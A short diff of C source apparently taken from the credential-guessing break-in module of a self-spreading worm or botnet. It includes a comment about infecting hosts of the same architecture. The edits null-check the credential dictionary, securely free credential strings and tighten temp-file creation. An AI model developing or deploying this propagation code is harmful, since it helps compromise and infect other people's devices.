@@ -232,6 +232,10 @@ static bool bne_build_cred_set (prne_bne_t *ctx) {
 	bool ret = true;
 
 	prne_iset_clear(&ctx->cred_set);
+	if (ctx->param.cred_dict == NULL) {
+		return true;
+	}
+
 	for (size_t i = 0; ret && i < ctx->param.cred_dict->cnt; i += 1) {
 		ret = prne_iset_insert(
 			&ctx->cred_set,
@@ -269,8 +273,8 @@ static void bne_delete_cred_w_id (prne_bne_t *ctx, const char *id) {
 }
 
 static void bne_free_result_cred (prne_bne_t *ctx) {
-	prne_free(ctx->result.cred.id);
-	prne_free(ctx->result.cred.pw);
+	prne_sfree_str(ctx->result.cred.id);
+	prne_sfree_str(ctx->result.cred.pw);
 	ctx->result.cred.id = NULL;
 	ctx->result.cred.pw = NULL;
 }
@@ -2072,8 +2076,8 @@ END: // CATCH
 	if (f_ret >= 0) {
 		bne_sh_rm_lockfile(sh_ctx);
 	}
-	prne_free(exec_name);
-	prne_free(lock_name);
+	prne_sfree_str(exec_name);
+	prne_sfree_str(lock_name);
 
 	return ret;
 }
@@ -2466,7 +2470,7 @@ static bool bne_vhtbt_do_upbin_us (
 // TRY
 	fd = ctx->param.cb.tmpfile(
 		ctx->param.cb_ctx,
-		O_CREAT | O_TRUNC | O_WRONLY,
+		O_CREAT | O_TRUNC | O_WRONLY | O_EXCL,
 		0700,
 		0,
 		&tmpfile_path);
@@ -4172,11 +4176,10 @@ prne_bne_t *prne_alloc_bne (
 
 	if (ctr_drbg == NULL ||
 		param->cb.exec_name == NULL ||
-		param->rcb == NULL ||
+		param->rcb == NULL)
 		/* The instance will only be able to infect hosts with same arch without
 		bin archive. */
 		// param->rcb->ba == NULL ||
-		param->cred_dict->cnt == 0)
 	{
 		errno = EINVAL;
 		return NULL;
